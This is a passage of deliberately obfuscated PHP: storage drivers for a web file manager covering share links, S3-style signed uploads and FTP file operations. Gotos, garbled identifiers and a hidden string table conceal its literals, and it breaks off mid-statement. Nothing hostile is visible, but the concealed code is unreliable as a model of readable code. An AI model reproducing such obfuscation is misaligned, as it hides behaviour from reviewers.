<?php
 goto bõƒÏå÷Ó; Aœˆ¹ÑòÁ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($CÖ‚ÅĞ‡Ò«) { $this->pathParse = $CÖ‚ÅĞ‡Ò«; } protected function infoParse($c…†‡î‚‡†, $FôÁñ”²”¬ = false) { $Dš©ŸÈÎå— =& $_SERVER[Æ¼ôºÙï]; return Action($Dš©ŸÈÎå—[1049])->sharePathInfo($this->pathParse[$Dš©ŸÈÎå—[75]], !0, $FôÁñ”²”¬); } public function listPath($b×ÁË¢ñŠÉ, $C¨›è›—Òğ = false) { $e¢êÚ­„¡ˆ =& $_SERVER[Æ¼ôºÙï]; $D¢İ˜„ğİ = IO::listPath($b×ÁË¢ñŠÉ, $C¨›è›—Òğ); foreach ($D¢İ˜„ğİ as $CÒšÌ·Üó => $EÆ¼ºóÄää) { if (!in_array($CÒšÌ·Üó, array($e¢êÚ­„¡ˆ[73], $e¢êÚ­„¡ˆ[74]))) { continue; } foreach ($EÆ¼ºóÄää as $E¨Ú¨» => $cì„¶§—¼˜) { $cì„¶§—¼˜ = Action($e¢êÚ­„¡ˆ[1198])->parsePathChildren($cì„¶§—¼˜, array($e¢êÚ­„¡ˆ[405] => $b×ÁË¢ñŠÉ)); $D¢İ˜„ğİ[$CÒšÌ·Üó][$E¨Ú¨»] = Action($e¢êÚ­„¡ˆ[1049])->shareItemInfo($cì„¶§—¼˜); } } return $D¢İ˜„ğİ; } public function listAll($cÌÛ…˜”ãƒ) { $E®ÄİéÓ‘ =& $_SERVER[Æ¼ôºÙï]; $DµÃø‡‹©… = IO::listAll($cÌÛ…˜”ãƒ); foreach ($DµÃø‡‹©… as &$D„½©ùÈÔ) { $D„½©ùÈÔ = array_merge(IO::info($D„½©ùÈÔ[$E®ÄİéÓ‘[75]]), $D„½©ùÈÔ); $D„½©ùÈÔ[$E®ÄİéÓ‘[84]] = Action($E®ÄİéÓ‘[1049])->shareItemInfo($D„½©ùÈÔ); } unset($D„½©ùÈÔ); return $DµÃø‡‹©…; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($eÌºåÌÃö‰) { parent::__construct($eÌºåÌÃö‰); $this->signatureVersion($_SERVER[Æ¼ôºÙï][210]); } public function uploadFormData($fØ°çæš©Æ, $ağÊÚì™ô = 3600) { goto aÁÈ‰‚æù; c‹†ÚÆ­Šâ: $c°Ôá¦Èê¸ = $EêßÒŠêÂİ[1201]; $føÆŠ¤¥ÑÂ = $ağÊÚì™ô . $EêßÒŠêÂİ[33]; $B³Ë¦ŞóÔª = $EêßÒŠêÂİ[1165]; goto c–ÁŠ‰”×Ğ; AÎË¸Åˆ›: $bç“Ê‘Å”¶ = base64_encode(json_encode($DÁ˜ÏâÔ±µ)); $E§‰¤‰Ãğø = hash_hmac($EêßÒŠêÂİ[1209], $a‚Ïœ®Îè, $EêßÒŠêÂİ[1210] . $this->secret, !0); $BÓê³œƒÁÈ = hash_hmac($EêßÒŠêÂİ[1209], $this->region, $E§‰¤‰Ãğø, !0); goto c¿õ¬šÁÂ; Bˆ‰÷·‘¯¢: $b½†¾µŞ‚è = array($EêßÒŠêÂİ[209] => $EêßÒŠêÂİ[33], $EêßÒŠêÂİ[1211] => $EêßÒŠêÂİ[33], $EêßÒŠêÂİ[1169] => $dÀ¶ÄôŞŒÊ, $EêßÒŠêÂİ[1173] => $B³Ë¦ŞóÔª, $EêßÒŠêÂİ[1177] => $bç“Ê‘Å”¶, $EêßÒŠêÂİ[1212] => $fÍÜØ‹·×Ï, $EêßÒŠêÂİ[1213] => $F”ğº—ÄÚì, $EêßÒŠêÂİ[1214] => $BáßÕšÄĞÊ, $EêßÒŠêÂİ[1215] => $føÆŠ¤¥ÑÂ, $EêßÒŠêÂİ[1216] => $B´êñÕö‘ , $EêßÒŠêÂİ[175] => $this->getHost()); return $b½†¾µŞ‚è; goto b‚ ²àá; aÁÈ‰‚æù: $EêßÒŠêÂİ =& $_SERVER[Æ¼ôºÙï]; $dÀ¶ÄôŞŒÊ = $EêßÒŠêÂİ[191]; $F”ğº—ÄÚì = $EêßÒŠêÂİ[1199]; goto B·Éä¯¾çœ; c¿õ¬šÁÂ: $cõ¤ó âŠÊ = hash_hmac($EêßÒŠêÂİ[1209], $FÀŸøĞ‹ÈÀ, $BÓê³œƒÁÈ, !0); $f¦Ï“Ã°ë– = hash_hmac($EêßÒŠêÂİ[1209], $c°Ôá¦Èê¸, $cõ¤ó âŠÊ, !0); $B´êñÕö‘  = hash_hmac($EêßÒŠêÂİ[1209], $bç“Ê‘Å”¶, $f¦Ï“Ã°ë–); goto Bˆ‰÷·‘¯¢; c–ÁŠ‰”×Ğ: $añèÉ˜«©‰ = array($this->accessKey, $a‚Ïœ®Îè, $this->region, $FÀŸøĞ‹ÈÀ, $c°Ôá¦Èê¸); $fÍÜØ‹·×Ï = implode($EêßÒŠêÂİ[8], $añèÉ˜«©‰); $DÁ˜ÏâÔ±µ = array($EêßÒŠêÂİ[1167] => gmdate($EêßÒŠêÂİ[1166], strtotime($EêßÒŠêÂİ[1202])), $EêßÒŠêÂİ[1168] => array(array($EêßÒŠêÂİ[1170] => $this->bucket), array($EêßÒŠêÂİ[1169] => $dÀ¶ÄôŞŒÊ), array($EêßÒŠêÂİ[1171], $EêßÒŠêÂİ[1172], $EêßÒŠêÂİ[33]), array($EêßÒŠêÂİ[1171], $EêßÒŠêÂİ[1203], $EêßÒŠêÂİ[33]), array($EêßÒŠêÂİ[1171], $EêßÒŠêÂİ[1204], $EêßÒŠêÂİ[33]), array($EêßÒŠêÂİ[1173] => $B³Ë¦ŞóÔª), array($EêßÒŠêÂİ[1205] => $fÍÜØ‹·×Ï), array($EêßÒŠêÂİ[1206] => $F”ğº—ÄÚì), array($EêßÒŠêÂİ[1207] => $BáßÕšÄĞÊ), array($EêßÒŠêÂİ[1208] => $føÆŠ¤¥ÑÂ))); goto AÎË¸Åˆ›; B·Éä¯¾çœ: $FÀŸøĞ‹ÈÀ = $EêßÒŠêÂİ[59]; $BáßÕšÄĞÊ = gmdate($EêßÒŠêÂİ[1200]); $a‚Ïœ®Îè = gmdate($EêßÒŠêÂİ[709]); goto c‹†ÚÆ­Šâ; b‚ ²àá: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($Fœ›õª–Ÿ) { parent::__construct(); if (count($Fœ›õª–Ÿ) > 0) { $this->_init($Fœ›õª–Ÿ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($cãê‹ÜÆ‰ë) { $A‚Àğ¨ÜÊ =& $_SERVER[Æ¼ôºÙï]; global $config; $this->appCharset = $config[$A‚Àğ¨ÜÊ[1217]]; $this->systemCharset = $config[$A‚Àğ¨ÜÊ[1218]]; if (isset($cãê‹ÜÆ‰ë[$A‚Àğ¨ÜÊ[1219]]) && $cãê‹ÜÆ‰ë[$A‚Àğ¨ÜÊ[1219]]) { $this->systemCharset = $cãê‹ÜÆ‰ë[$A‚Àğ¨ÜÊ[1219]]; } } public function iconvApp($eÀ…•ñÚ…‰) { return $this->iconvTo($eÀ…•ñÚ…‰, $this->systemCharset, $this->appCharset); } public function iconvSystem($Bê–Û„ŠÆ) { return $this->iconvTo($Bê–Û„ŠÆ, $this->appCharset, $this->systemCharset); } public function getPathOuter($dßğê…›ÌÛ) { goto dŸ×‹©‰®¾; dŸ×‹©‰®¾: $BãƒÍØ†­ =& $_SERVER[Æ¼ôºÙï]; $bÌ™ë‚„ù = $this->iconvApp($this->pathBase); $dßğê…›ÌÛ = $this->iconvApp($dßğê…›ÌÛ); goto e’¨‘óÊ©‘; e’¨‘óÊ©‘: if (substr($bÌ™ë‚„ù, 0, 2) == $BãƒÍØ†­[1220]) { $bÌ™ë‚„ù = BASIC_PATH . substr($bÌ™ë‚„ù, 2); } if (substr($dßğê…›ÌÛ, 0, 2) == $BãƒÍØ†­[1220]) { $dßğê…›ÌÛ = BASIC_PATH . substr($dßğê…›ÌÛ, 2); } $bÌ™ë‚„ù = KodIO::clear($bÌ™ë‚„ù); goto eï…„Üˆ¨ò; eï…„Üˆ¨ò: $dßğê…›ÌÛ = KodIO::clear($dßğê…›ÌÛ); $dßğê…›ÌÛ = substr($dßğê…›ÌÛ, strlen($bÌ™ë‚„ù)); if (empty($this->pathDriver)) { return $dßğê…›ÌÛ; } goto DÉë¦×¡ä; DÉë¦×¡ä: return $this->pathDriver . $BãƒÍØ†­[8] . ltrim($dßğê…›ÌÛ, $BãƒÍØ†­[8]); goto F†‚‰å†±; F†‚‰å†±: } private function _init($F·‡İéó›² = array()) { $e”ìÃ‚œ =& $_SERVER[Æ¼ôºÙï]; if (!function_exists($e”ìÃ‚œ[1221])) { throw new Exception(LNG($e”ìÃ‚œ[1222])); } $this->config = $F·‡İéó›²; $this->charsetReset($F·‡İéó›²); foreach ($F·‡İéó›² as $C øéØø§£ => $aŠĞÎ’‡¹˜) { if (isset($this->{$C øéØø§£})) { $this->{$C øéØø§£} = $aŠĞÎ’‡¹˜; } } return $this->_login($F·‡İéó›²); } private function _login($E™Ç¾‡ù…Å) { goto F­ÕÕØ…¬ğ; F¬È‹†Üš: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $fØ£¨‡ñµš = @ftp_login($this->connect, $this->username, $this->userpass); goto fÓ±ÈÆĞ•; d©İ¡øß¬ë: $B©²±ù®„ = isset($c©²Úë¤Ñ[$D¡Íö®œ‚à[174]]) && $c©²Úë¤Ñ[$D¡Íö®œ‚à[174]] == $D¡Íö®œ‚à[1223] ? !0 : !1; $this->scheme = $B©²±ù®„ ? $D¡Íö®œ‚à[1224] : $D¡Íö®œ‚à[1225]; $this->port = isset($c©²Úë¤Ñ[$D¡Íö®œ‚à[176]]) ? $c©²Úë¤Ñ[$D¡Íö®œ‚à[176]] : 21; goto F¬È‹†Üš; F­ÕÕØ…¬ğ: $D¡Íö®œ‚à =& $_SERVER[Æ¼ôºÙï]; static $dŸ…Üšôº÷ = array(); $B§Ì³””ô‡ = md5(json_encode($E™Ç¾‡ù…Å)); goto A‚ ‰ã„ìç; a§ÀâË‘›„: $dŸ…Üšôº÷[$B§Ì³””ô‡] = array($D¡Íö®œ‚à[1226] => $this->connect, $D¡Íö®œ‚à[175] => $this->host, $D¡Íö®œ‚à[174] => $this->scheme, $D¡Íö®œ‚à[176] => $this->port); return $fØ£¨‡ñµš; goto e¸ÚŒ†ÑĞ»; fÓ±ÈÆĞ•: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $aÍ”Ä­©ÙÔ = $this->pasv == $D¡Íö®œ‚à[86] ? !0 : !1; @ftp_pasv($this->connect, $aÍ”Ä­©ÙÔ); goto a§ÀâË‘›„; A‚ ‰ã„ìç: if (isset($dŸ…Üšôº÷[$B§Ì³””ô‡])) { foreach ($dŸ…Üšôº÷[$B§Ì³””ô‡] as $dº‡Šªí’ => $C«Íµ«‹™è) { $this->{$dº‡Šªí’} = $C«Íµ«‹™è; } return !0; } $c©²Úë¤Ñ = parse_url(trim($this->server, $D¡Íö®œ‚à[8])); $this->host = $c©²Úë¤Ñ[$D¡Íö®œ‚à[175]]; goto d©İ¡øß¬ë; e¸ÚŒ†ÑĞ»: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($A¶†‡ëºá, $C“Ú²ª¥Ó = '', $EŞë´š ßÜ = REPEAT_RENAME) { if ($this->setContent($A¶†‡ëºá, $C“Ú²ª¥Ó)) { return $this->getPathOuter($A¶†‡ëºá); } return !1; } public function mkdir($BºÓ§±à, $f“·ñ¢´‹À = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $BºÓ§±à = $this->iconvSystem($BºÓ§±à); if ($this->_isFolder($BºÓ§±à) || @ftp_mkdir($this->connect, $BºÓ§±à)) { return $this->getPathOuter($BºÓ§±à); } if (!$this->mkdir($this->pathFather($BºÓ§±à))) { return !1; } if ($BºÓ§±à = @ftp_mkdir($this->connect, $BºÓ§±à)) { return $this->getPathOuter($BºÓ§±à); } return !1; } public function copyFile($EÏ—¹§¹§Ì, $B”¤—˜¿‡Ï) { goto A¶Ú…¼¤óÆ; A¶Ú…¼¤óÆ: if (!$this->_isconn()) { return !1; } $dîÌ¬¢Óğœ = $this->pathThis($this->iconvSystem($EÏ—¹§¹§Ì)); $d”ôÚŞ¬ï = $this->tempFile($dîÌ¬¢Óğœ); goto EÕøÉ£¬íù; EÕøÉ£¬íù: $bˆ³£„õšÃ = $this->iconvApp($d”ôÚŞ¬ï); $this->download($EÏ—¹§¹§Ì, $bˆ³£„õšÃ); $E­‚‰–¿ = $this->upload($B”¤—˜¿‡Ï, $bˆ³£„õšÃ); goto F¨ñ®ÍßÄà; F¨ñ®ÍßÄà: $this->tempFileRemve($d”ôÚŞ¬ï); return $E­‚‰–¿; goto böË«…Ò‹½; böË«…Ò‹½: } public function moveFile($cœò¾äÀ, $a¹Ü¶ÚÔÅ) { if (!$this->_isconn()) { return !1; } $cœò¾äÀ = $this->iconvSystem($cœò¾äÀ); $a¹Ü¶ÚÔÅ = $this->iconvSystem($a¹Ü¶ÚÔÅ); $e‚Şã®²‘¬ = @ftp_rename($this->connect, $cœò¾äÀ, $a¹Ü¶ÚÔÅ); return $e‚Şã®²‘¬ ? $this->getPathOuter($a¹Ü¶ÚÔÅ) : !1; } public function delFile($Eæùçõàô) { if (!$this->_isconn()) { return !1; } $Eæùçõàô = $this->iconvSystem($Eæùçõàô); return @ftp_delete($this->connect, $Eæùçõàô); } public function delFolder($fÙåğ’–×) { goto Dã§±¯Ù¢; Dã§±¯Ù¢: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $FÛôéÓ·èÅ = $e²×…×°ŠÈ = array(); goto D¿õÔ„¨Ô°; A‰Å¬¥½î: foreach ($FÛôéÓ·èÅ as $d‰ÀÚµèÆâ) { $d‰ÀÚµèÆâ = $this->iconvSystem($d‰ÀÚµèÆâ); $fÆÎœ¯±ê‰ = @ftp_rmdir($this->connect, $d‰ÀÚµèÆâ); if (!$fÆÎœ¯±ê‰) { return !1; } } $fÙåğ’–× = $this->iconvSystem($fÙåğ’–×); return @ftp_rmdir($this->connect, $fÙåğ’–×); goto f·íŠ‹Ò™; D¿õÔ„¨Ô°: $this->fileList($fÙåğ’–×, $FÛôéÓ·èÅ, $e²×…×°ŠÈ, !0); $this->listItemCache = !0; foreach ($e²×…×°ŠÈ as $C¸‡óËˆ©º) { $d‰ÀÚµèÆâ = $this->iconvSystem($C¸‡óËˆ©º[$_SERVER[Æ¼ôºÙï][28]]); $fÆÎœ¯±ê‰ = @ftp_delete($this->connect, $d‰ÀÚµèÆâ); if (!$fÆÎœ¯±ê‰) { return !1; } } goto A‰Å¬¥½î; f·íŠ‹Ò™: } public function rename($DØñØ‡¢½¨, $E¥ù£ÕŠù¼) { goto dœ´Ñ³÷ó…; C¨¢àÀö§ß: return $fåë“™ÉàÀ ? $this->getPathOuter($D‡§Ö¦»Íõ) : !1; goto e¤±Ãì‚Ã; CÔä ôªù·: $D‡§Ö¦»Íõ = rtrim($fƒ½Ó¶‡ã”, $D°«Íï¿İ[8]) . $D°«Íï¿İ[8] . $D¬˜—¼Ó¥Ì; $fåë“™ÉàÀ = @ftp_rename($this->connect, $DØñØ‡¢½¨, $D‡§Ö¦»Íõ); $D‡§Ö¦»Íõ = $this->iconvApp($D‡§Ö¦»Íõ); goto C¨¢àÀö§ß; AÎæ¶’÷öî: $D¬˜—¼Ó¥Ì = $this->iconvSystem($D¬˜—¼Ó¥Ì); $DØñØ‡¢½¨ = $this->iconvSystem($DØñØ‡¢½¨); $fƒ½Ó¶‡ã” = $this->pathFather($DØñØ‡¢½¨); goto CÔä ôªù·; dœ´Ñ³÷ó…: $D°«Íï¿İ =& $_SERVER[Æ¼ôºÙï]; if (!$this->_isconn()) { return !1; } $D¬˜—¼Ó¥Ì = $this->fileNameAuto($this->pathFather($DØñØ‡¢½¨), $E¥ù£ÕŠù¼); goto AÎæ¶’÷öî; e¤±Ãì‚Ã: } private function folderInfo($d¢¬àïáÙï, $Eèìƒ±øñ = false) { $f“Ş¤’º¾¤ =& $_SERVER[Æ¼ôºÙï]; $A…•ƒ×ó²¸ = array($f“Ş¤’º¾¤[28] => $this->pathThis($d¢¬àïáÙï), $f“Ş¤’º¾¤[75] => $this->getPathOuter($f“Ş¤’º¾¤[8] . $d¢¬àïáÙï), $f“Ş¤’º¾¤[29] => $f“Ş¤’º¾¤[76]); if ($Eèìƒ±øñ) { return $A…•ƒ×ó²¸; } $A…•ƒ×ó²¸[$f“Ş¤’º¾¤[192]] = $A…•ƒ×ó²¸[$f“Ş¤’º¾¤[83]] = 0; $A…•ƒ×ó²¸[$f“Ş¤’º¾¤[193]] = $A…•ƒ×ó²¸[$f“Ş¤’º¾¤[194]] = !0; return $A…•ƒ×ó²¸; } private function fileInfo($D×ŸÜ“„¼›, $Dİ‹–ˆ„å = false, $a’ÖŒ„§Öù = array()) { goto C—Üšµ—ÅÉ; e¶‡²‡·ó: $fœ†ŒÙåè[$Dòª‡‹¾³[192]] = $fœ†ŒÙåè[$Dòª‡‹¾³[83]] = 0; $fœ†ŒÙåè[$Dòª‡‹¾³[193]] = $fœ†ŒÙåè[$Dòª‡‹¾³[194]] = !0; $bŒ±¼í÷µù = $this->iconvSystem($D×ŸÜ“„¼›); goto f¸Œ‚ì‘; f¸Œ‚ì‘: $fœ†ŒÙåè[$Dòª‡‹¾³[83]] = @ftp_mdtm($this->connect, $bŒ±¼í÷µù); if (empty($a’ÖŒ„§Öù)) { $a’ÖŒ„§Öù = $this->objectMeta($D×ŸÜ“„¼›); if (!$a’ÖŒ„§Öù) { return $fœ†ŒÙåè; } } $fœ†ŒÙåè[$Dòª‡‹¾³[77]] = $a’ÖŒ„§Öù[$Dòª‡‹¾³[77]]; goto e§Êğ ë‡½; e§Êğ ë‡½: return $fœ†ŒÙåè; goto aÊ‰ßÒŸİ‡; C—Üšµ—ÅÉ: $Dòª‡‹¾³ =& $_SERVER[Æ¼ôºÙï]; $fœ†ŒÙåè = array($Dòª‡‹¾³[28] => $this->pathThis($D×ŸÜ“„¼›), $Dòª‡‹¾³[75] => $this->getPathOuter($Dòª‡‹¾³[8] . $D×ŸÜ“„¼›), $Dòª‡‹¾³[29] => $Dòª‡‹¾³[173], $Dòª‡‹¾³[77] => isset($a’ÖŒ„§Öù[$Dòª‡‹¾³[77]]) ? $a’ÖŒ„§Öù[$Dòª‡‹¾³[77]] : 0, $Dòª‡‹¾³[167] => $this->ext($D×ŸÜ“„¼›)); if ($Dİ‹–ˆ„å) { return $fœ†ŒÙåè; } goto e¶‡²‡·ó; aÊ‰ßÒŸİ‡: } public function size($aâ¿¨–ÓÜ) { $Dİ¡Ëİ×œÃ = $this->objectMeta($aâ¿¨–ÓÜ); return $Dİ¡Ëİ×œÃ ? $Dİ¡Ëİ×œÃ[$_SERVER[Æ¼ôºÙï][77]] : 0; } public function info($cÕ‘ôé£˜) { if ($this->isFile($cÕ‘ôé£˜)) { return $this->fileInfo($cÕ‘ôé£˜, 0); } else { if ($this->isFolder($cÕ‘ôé£˜)) { return $this->folderInfo($cÕ‘ôé£˜); } } return !1; } private function fileList($a©·„«ÂÇ, &$c´‚÷™Š“Ë, &$dâÕõ¸ÉÙ, $Eé‚„‹•¨ = false) { goto d“‹Áç³Šâ; aõ¯¹¤ê™: $FŞ¨®ÔßÀ” = array($aªå¶ˆÄæŒ[94] => 1, $aªå¶ˆÄæŒ[1227] => 1); foreach ($Bâ¾Æ§šÅ as $EÓğƒ²ŒŸº) { goto DÜÑ¹õÀ¬—; dÛ»”Û¾•: if ($f¥ô¹Ó½) { $c´‚÷™Š“Ë[] = $F‹§É…­Œâ; if ($Eé‚„‹•¨) { $this->fileList($F‹§É…­Œâ, $c´‚÷™Š“Ë, $dâÕõ¸ÉÙ, $Eé‚„‹•¨); } continue; } $dâÕõ¸ÉÙ[] = $a±Œ¸¯ùòŒ; goto cçØÇë¼²ë; Fé‡”î‚Ù´: if (!$F‹§É…­Œâ || isset($FŞ¨®ÔßÀ”[$F‹§É…­Œâ])) { continue; } $F‹§É…­Œâ = $this->iconvApp($a©·„«ÂÇ . ltrim($F‹§É…­Œâ, $aªå¶ˆÄæŒ[8])); $a±Œ¸¯ùòŒ = array($aªå¶ˆÄæŒ[28] => $F‹§É…­Œâ, $aªå¶ˆÄæŒ[29] => $aªå¶ˆÄæŒ[173], $aªå¶ˆÄæŒ[77] => $c¯Ë‡İÒ[4]); goto A‡´î„ˆÌç; DÜÑ¹õÀ¬—: $c¯Ë‡İÒ = $this->_listItem($EÓğƒ²ŒŸº); if ($c¯Ë‡İÒ[0] == $aªå¶ˆÄæŒ[714]) { continue; } $F‹§É…­Œâ = $c¯Ë‡İÒ[8]; goto Fé‡”î‚Ù´; A‡´î„ˆÌç: if (substr($EÓğƒ²ŒŸº, 0, 1) == $aªå¶ˆÄæŒ[1228]) { $a±Œ¸¯ùòŒ[$aªå¶ˆÄæŒ[29]] = $aªå¶ˆÄæŒ[76]; $a±Œ¸¯ùòŒ[$aªå¶ˆÄæŒ[77]] = 0; } $f¥ô¹Ó½ = $a±Œ¸¯ùòŒ[$aªå¶ˆÄæŒ[29]] == $aªå¶ˆÄæŒ[76] ? !0 : !1; if ($Dªì‚¡‚‘º) { $this->cacheMethod($aªå¶ˆÄæŒ[197], $F‹§É…­Œâ, $f¥ô¹Ó½); $this->cacheMethod($aªå¶ˆÄæŒ[198], $F‹§É…­Œâ, $a±Œ¸¯ùòŒ); } goto dÛ»”Û¾•; cçØÇë¼²ë: } if ($Dªì‚¡‚‘º) { $this->cacheMethod($aªå¶ˆÄæŒ[197], $a©·„«ÂÇ, !0); } goto CæÒ‘; bÈšÈ‡×§: @ftp_chdir($this->connect, $aªå¶ˆÄæŒ[8]); $a©·„«ÂÇ = rtrim($a©·„«ÂÇ, $aªå¶ˆÄæŒ[8]) . $aªå¶ˆÄæŒ[8]; check_abort(); goto E’ÃÉ§‡ß; E’ÃÉ§‡ß: $Dªì‚¡‚‘º = $this->listItemCache === !1 ? !1 : !0; $Bâ¾Æ§šÅ = @ftp_rawlist($this->connect, $a©·„«ÂÇ); if (!$Bâ¾Æ§šÅ) { $Bâ¾Æ§šÅ = array(); } goto aõ¯¹¤ê™; d“‹Áç³Šâ: $aªå¶ˆÄæŒ =& $_SERVER[Æ¼ôºÙï]; $a©·„«ÂÇ = $this->iconvSystem($a©·„«ÂÇ); if (!$this->isFolder($a©·„«ÂÇ)) { return !1; } goto bÈšÈ‡×§; CæÒ‘: } private function _listItem($D±·èÇ«¥†) { if (empty($D±·èÇ«¥†)) { return array(); } $eªğã›ˆê« = preg_split($_SERVER[Æ¼ôºÙï][1229], $D±·èÇ«¥†); if (count($eªğã›ˆê«) <= 9) { return $eªğã›ˆê«; } $eªğã›ˆê«[8] = trim(substr($D±·èÇ«¥†, strpos($D±·èÇ«¥†, $eªğã›ˆê«[7]) + strlen($eªğã›ˆê«[7]))); return array_splice($eªğã›ˆê«, 0, 9); } public function listPath($Dã•˜Ùğ“ñ, $bƒ„³…èµ = false) { goto cõ¢ÎåéŸ²; DÍ÷©êÀ¹‰: return array($dºàåçÖÊß[74] => $DÇ¨¢¨£ã†, $dºàåçÖÊß[73] => $BŞšáè¶æ); goto eñóŒ¦Ëç²; cØ—‚¬¸’Ù: $this->fileList($Dã•˜Ùğ“ñ, $DÇ¨¢¨£ã†, $BŞšáè¶æ); foreach ($DÇ¨¢¨£ã† as $aøÃÓˆ¿À± => $Aª  Çßé) { $DÇ¨¢¨£ã†[$aøÃÓˆ¿À±] = $this->folderInfo($Aª  Çßé, $bƒ„³…èµ); } foreach ($BŞšáè¶æ as $aøÃÓˆ¿À± => $Aª  Çßé) { $BŞšáè¶æ[$aøÃÓˆ¿À±] = $this->fileInfo($Aª  Çßé[$dºàåçÖÊß[28]], $bƒ„³…èµ, $Aª  Çßé); } goto DÍ÷©êÀ¹‰; cõ¢ÎåéŸ²: $dºàåçÖÊß =& $_SERVER[Æ¼ôºÙï]; if (!$this->_isconn()) { return !1; } $DÇ¨¢¨£ã† = $BŞšáè¶æ = array(); goto cØ—‚¬¸’Ù; eñóŒ¦Ëç²: } public function has($f®Ñ¯¥Ä×ø, $Bë±Ñ›‚é· = false, $f»Ò»ŸªÙ = true) { goto Aœ»ù¥¨’ì; dƒŠİëÌ×: $this->fileList($f®Ñ¯¥Ä×ø, $D—¬‹ÕÉÜ›, $FìÔïÇ·É, $bÁëÇß÷•); if ($Bë±Ñ›‚é·) { return array($d©Ü’Ã¾[201] => count($FìÔïÇ·É), $d©Ü’Ã¾[202] => count($D—¬‹ÕÉÜ›)); } if ($f»Ò»ŸªÙ) { if (count($FìÔïÇ·É)) { return !0; } } else { if (count($D—¬‹ÕÉÜ›)) { return !0; } } goto Cƒší½’×ñ; Cƒší½’×ñ: return !1; goto dÙ«—êõê; Aœ»ù¥¨’ì: $d©Ü’Ã¾ =& $_SERVER[Æ¼ôºÙï]; $D—¬‹ÕÉÜ› = $FìÔïÇ·É = array(); $bÁëÇß÷• = $Bë±Ñ›‚é· ? !0 : !1; goto dƒŠİëÌ×; dÙ«—êõê: } public function listAll($d†Ù²òâ¨) { goto eÚàÃ“¼œ¥; aÔğŠ„ê…á: $this->fileList($d†Ù²òâ¨, $b¦Øï¼±¡•, $Cçôé’¯••, !0); $Fùº‰éêÁ = array(); foreach ($Cçôé’¯•• as $E¯¿ó¬«Á) { $Fùº‰éêÁ[$E¯¿ó¬«Á[$F›¶¯ó—[28]]] = $E¯¿ó¬«Á[$F›¶¯ó—[77]]; } goto bœ½ÌÉ…êË; eÚàÃ“¼œ¥: $F›¶¯ó— =& $_SERVER[Æ¼ôºÙï]; if (!$this->_isconn()) { return !1; } $b¦Øï¼±¡• = $Cçôé’¯•• = array(); goto aÔğŠ„ê…á; bœ½ÌÉ…êË: foreach ($b¦Øï¼±¡• as $E¯¿ó¬«Á) { if (is_string($E¯¿ó¬«Á)) { $Fùº‰éêÁ[$E¯¿ó¬«Á] = 0; } } return $this->listAllFiles($d†Ù²òâ¨, array_keys($Fùº‰éêÁ), $Fùº‰éêÁ); goto eÑó»›ƒ†·; eÑó»›ƒ†·: } public function getContent($Aì£Õ¡Öñ®) { if (!$this->_isconn()) { return !1; } $Aì£Õ¡Öñ® = $this->iconvSystem($Aì£Õ¡Öñ®); return $this->fileSubstr($Aì£Õ¡Öñ®); } public function setContent($f¿ÉŒ“ìÃ›, $Eƒ…áÃ¯‡– = '') { goto Eù°¥·ØŸø; Eù°¥·ØŸø: if (!$this->_isconn()) { return !1; } $fÌÂ¢ÕÒ­ = $this->pathThis($this->iconvSystem($f¿ÉŒ“ìÃ›)); $fã¶À±ô = $this->tempFile($fÌÂ¢ÕÒ­); goto b–‹’´À‹; b–‹’´À‹: file_put_contents($fã¶À±ô, $Eƒ…áÃ¯‡–); $eõ¨Şâ·ÛÂ = $this->upload($f¿ÉŒ“ìÃ›, $this->iconvApp($fã¶À±ô)); $this->tempFileRemve($fã¶À±ô); goto DÄáé‚”£ê; DÄáé‚”£ê: return $eõ¨Şâ·ÛÂ; goto FŸæ×Ã‡µÉ; FŸæ×Ã‡µÉ: } public function fileSubstr($C†®½Ÿìò‹, $F¯Œá¥™ = 0, $aÖ¸æñ˜ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($C†®½Ÿìò‹, $F¯Œá¥™, $aÖ¸æñ˜); } private function ftpRequest($eˆŸ®µ¢, $fÄÉ§š¤ = 0, $f§çÃÀÖİè = false) { goto EºÆî ­İ‰; EºÆî ­İ‰: $eˆŸ®µ¢ = $this->iconvSystem($eˆŸ®µ¢); $eÀÙíØÎ£ = $this->scheme . $this->host . $_SERVER[Æ¼ôºÙï][4] . $this->port; $A©œ×©¤ = curl_init(); goto e³ä™ğˆ‘í; e³ä™ğˆ‘í: curl_setopt($A©œ×©¤, CURLOPT_URL, $eÀÙíØÎ£ . $this->pathEncode($eˆŸ®µ¢)); curl_setopt($A©œ×©¤, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($f§çÃÀÖİè) { $cÅÉö˜£í = $fÄÉ§š¤ + $f§çÃÀÖİè - 1; curl_setopt($A©œ×©¤, CURLOPT_RANGE, "{$fÄÉ§š¤}\55{$cÅÉö˜£í}"); } goto CêìóÔ–³â; CêìóÔ–³â: curl_setopt($A©œ×©¤, CURLOPT_RETURNTRANSFER, 1); $aŒÃ›Ğ™ = curl_exec($A©œ×©¤); curl_close($A©œ×©¤); goto FáæçŒ¡; FáæçŒ¡: return $aŒÃ›Ğ™; goto cÇÀàøã±; cÇÀàøã±: } public function upload($C´å³»¬ñ, $F„ÍÌ…Í¥³, $b–‹ùßµñí = false, $Fˆ¬—ôŞã¢ = REPEAT_REPLACE) { goto F‡åÅªŸ¾¸; cø××‚ë–: if ($E‚ÔÉ¾äæÔ != FTP_FINISHED) { return !1; } return $this->getPathOuter($C´å³»¬ñ); goto FÄö‘óê‘÷; F‡åÅªŸ¾¸: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($C´å³»¬ñ))) { return !1; } $C´å³»¬ñ = $this->iconvSystem($C´å³»¬ñ); goto a»÷½ «êÏ; a»÷½ «êÏ: $F„ÍÌ…Í¥³ = $this->iconvSystem($F„ÍÌ…Í¥³); $E‚ÔÉ¾äæÔ = ftp_nb_put($this->connect, $C´å³»¬ñ, $F„ÍÌ…Í¥³, FTP_BINARY); while ($E‚ÔÉ¾äæÔ == 